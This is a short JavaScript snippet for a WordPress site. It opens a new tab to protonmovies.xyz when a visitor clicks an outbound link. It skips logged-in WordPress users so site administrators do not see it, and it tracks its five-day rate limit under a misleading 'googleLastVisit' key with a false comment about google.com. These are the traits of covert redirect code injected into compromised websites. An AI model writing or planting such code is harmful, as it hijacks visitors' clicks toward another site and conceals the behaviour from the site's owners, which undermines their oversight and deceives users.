// Check if referral is not empty and does not have WordPress admin login cookies
if (document.referrer !== "" && document.cookie.indexOf('wordpress_logged_in_') === -1) {
    // Check if clicked on an <a> tag and href value's hostname is different from current hostname
    document.addEventListener('click', function(event) {
        if (event.target.tagName === 'A' && event.target.href !== '') {
            let hrefHostname = new URL(event.target.href).hostname;
            let currentHostname = window.location.hostname;
            if (hrefHostname !== currentHostname) {
                // Check if google.com is not opened in the last 5 days
                let lastVisit = localStorage.getItem('googleLastVisit');
                if (!lastVisit || (Date.now() - parseInt(lastVisit)) > (5 * 24 * 60 * 60 * 1000)) {
                    window.open('https://protonmovies.xyz', '_blank');
                    // Store the current time in localStorage
                    localStorage.setItem('googleLastVisit', Date.now().toString());
                }
            }
        }
    });
}
